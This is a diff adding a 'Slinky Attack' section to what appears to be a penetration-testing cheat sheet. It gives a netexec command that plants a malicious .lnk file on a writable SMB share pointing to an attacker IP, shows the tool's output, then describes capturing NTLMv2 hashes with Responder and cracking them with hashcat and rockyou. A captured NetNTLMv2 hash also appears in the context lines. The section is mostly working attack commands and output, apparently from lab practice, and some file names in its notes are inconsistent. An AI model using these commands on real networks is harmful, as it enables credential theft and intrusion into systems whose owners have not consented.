@@ -630,6 +630,37 @@ kiosec::CYBERLAB:09de3ec911a58870:0D4F3A68A10DAADDF7B4382A16916822:0101000000000
 See : https://github.com/Kiosec/Cracking/blob/main/README.md#netntlmv2ntlmv2-hash
 ```
 
+#### Slinky Attack
+
+##### Using ntml_left
+
+##### Using NXC
+```
+# I don't know why, but nxc attack is less viable than ntm-left.
+# Step01: Upload a malicious lst file on the smb share
+ ┌──(root㉿kali)-[/home/kali]
+└─# nxc smb buildingmagic.local -u h.potch -p '[REDACTED]' -M slinky -o NAME=sneayky.lnk SERVER=10.200.43.182 SHARES=File-Share
+SMB         10.0.23.134     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.23.134     445    DC01             [+] hack.smarter\Guest: 
+SMB         10.0.23.134     445    DC01             [*] Enumerated shares
+SMB         10.0.23.134     445    DC01             Share           Permissions     Remark
+SMB         10.0.23.134     445    DC01             -----           -----------     ------
+SMB         10.0.23.134     445    DC01             ADMIN$                          Remote Admin
+SMB         10.0.23.134     445    DC01             C$                              Default share
+SMB         10.0.23.134     445    DC01             IPC$            READ            Remote IPC
+SMB         10.0.23.134     445    DC01             NETLOGON                        Logon server share 
+SMB         10.0.23.134     445    DC01             Share           READ,WRITE      
+SMB         10.0.23.134     445    DC01             SYSVOL                          Logon server share 
+SLINKY      10.0.23.134     445    DC01             [+] Found writable share: Share
+SLINKY      10.0.23.134     445    DC01             [+] Created LNK file on the Share share
+ 
+# Step 02: Open a responder listener on the network and wait that a user open the .lst file in order to obtain the hash.
+
+# Step 03: Try to crack the hash
+──(root㉿kali)-[/home/kali]
+└─# hashcat -a 0 -m 5600 hash.txt rockyou.txt 
+```
+
 
 ## 🔻Port 143, 993
 #### IMAP bruteforce
